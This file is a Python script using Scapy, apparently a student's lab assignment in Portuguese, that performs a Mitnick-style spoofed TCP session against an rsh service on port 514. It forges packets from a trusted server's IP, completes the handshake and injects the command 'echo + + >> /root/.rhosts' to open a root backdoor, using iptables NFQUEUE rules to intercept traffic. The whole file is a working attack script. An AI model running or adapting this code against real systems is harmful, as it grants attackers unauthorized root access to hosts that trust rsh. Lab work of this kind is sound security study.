# Eduardo Henrique dos Santos Cerolli
# GRR20190397

from scapy.all import *
from netfilterqueue import NetfilterQueue
from time import sleep

# Configurações de rede
attacker_ip = "10.9.0.1"
xterminal_ip = "10.9.0.5"
trusted_server_ip = "10.9.0.6"

# Porta de origem e destino
src_port = 1023
dst_port = 514

# pega a interface de rede usada pelo ip 10.9.0.1
def obter_interface():
    comando = f"arp | grep {xterminal_ip} | awk '{{print $5}}'"
    processo = subprocess.run(comando, shell=True, capture_output=True, text=True)
    return processo.stdout.strip()

# envia mensagem SYN para inicio do three-way-handshake
def envia_SYN(seq):
    ip = IP()
    ip.src = trusted_server_ip
    ip.dst = xterminal_ip

    tcp = TCP()
    tcp.seq = seq
    tcp.sport = src_port
    tcp.dport = dst_port
    tcp.flags = "S"

    pacote = ip / tcp

    return sr1(pacote)

# apos receber SYN-ACK envia o ACK para finalizar o three-way-handshake
def envia_ACK(seq, ack):
    ip = IP()
    ip.src = trusted_server_ip
    ip.dst = xterminal_ip

    tcp = TCP()
    tcp.seq = seq
    tcp.ack = ack
    tcp.sport = src_port
    tcp.dport = dst_port
    tcp.flags = "A"

    pacote = ip / tcp

    send(pacote)

# envia mensagem RSH para abrir o backdoor atualizando o arquivo .rhosts do x-terminal
def envia_RSH(seq, ack):
    ip = IP()
    ip.src = trusted_server_ip
    ip.dst = xterminal_ip

    tcp = TCP()
    tcp.seq = seq
    tcp.ack = ack
    tcp.sport = src_port
    tcp.dport = dst_port
    tcp.flags = "PA"

    rsh_command = b"\x00root\x00root\x00echo + + >> /root/.rhosts\x00"

    pacote = ip / tcp / rsh_command

    send(pacote)

# processa os pacotes lidos no bind, devolve para a rede os que não interessam para o ataque
def processa_pacote(pacote):
    pacote_capturado = IP(pacote.get_payload())
    
    if pacote_capturado.haslayer(TCP) and pacote_capturado[TCP].dport == 514:
        print("Pacote capturado e processado:")
        pacote_capturado.show()
        
    else:
        pacote.accept()



interface = obter_interface()
# adiciona regra para redirecionar os pacotes para nossa fila
os.system(f'iptables -I FORWARD -i {interface} -p tcp --dport 514 -j NFQUEUE --queue-num 1')

nfqueue = NetfilterQueue()
nfqueue.bind(1, processa_pacote)

seq = 123

resposta = envia_SYN(seq)

sleep(0.5)

ack = resposta.seq + 1
seq = seq + 1
envia_ACK(seq, ack)

envia_RSH(seq, ack)

# remove a regra do bind
os.system(f'iptables -D FORWARD -i {interface} -p tcp --dport 514 -j NFQUEUE --queue-num 1')